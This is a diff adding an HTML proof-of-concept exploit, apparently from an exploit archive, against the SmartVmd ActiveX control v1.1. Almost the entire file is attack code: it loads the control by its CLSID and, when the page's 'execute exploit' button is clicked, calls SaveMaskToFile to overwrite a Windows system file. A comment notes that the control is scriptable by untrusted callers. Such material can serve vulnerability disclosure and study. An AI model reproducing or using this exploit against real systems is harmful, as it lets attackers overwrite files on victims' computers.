@@ -1,0 +1,34 @@
+&amp;lt;HTML&amp;gt;
+&amp;lt;BODY&amp;gt;
+
+&amp;lt;b&amp;gt;   
+	Author : Houssamix    &amp;lt;br/&amp;gt;  &amp;lt;br/&amp;gt;  &amp;lt;br/&amp;gt;
+
+   	SmartVmd ActiveX v 1.1 remote File Overwrite Exploit   &amp;lt;br/&amp;gt;
+
+	download : http://www.smartvmd.com/setup/SetupActiveXVmd.msi  &amp;lt;br/&amp;gt;
+&amp;lt;b/&amp;gt;
+
+
+&amp;lt;object id=hsmx classid=&amp;quot;clsid:{E3462D53-47A6-11D8-8EF6-DAE89272743C}&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;
+
+&amp;lt;SCRIPT&amp;gt;
+/*
+
+Report for Clsid: {E3462D53-47A6-11D8-8EF6-DAE89272743C}
+RegKey Safe for Script: Faux
+RegKey Safe for Init: Faux
+Implements IObjectSafety: Vrai
+IDisp Safe:  Safe for untrusted: caller  
+
+*/
+function hehe()
+ {
+     File = &amp;quot;c:\\windows\\system_.ini&amp;quot;
+   hsmx.SaveMaskToFile(File)
+ }
+
+&amp;lt;/SCRIPT&amp;gt;
+&amp;lt;input language=JavaScript onclick=hehe() type=button value=&amp;quot;execute exploit&amp;quot;&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/HTML&amp;gt;
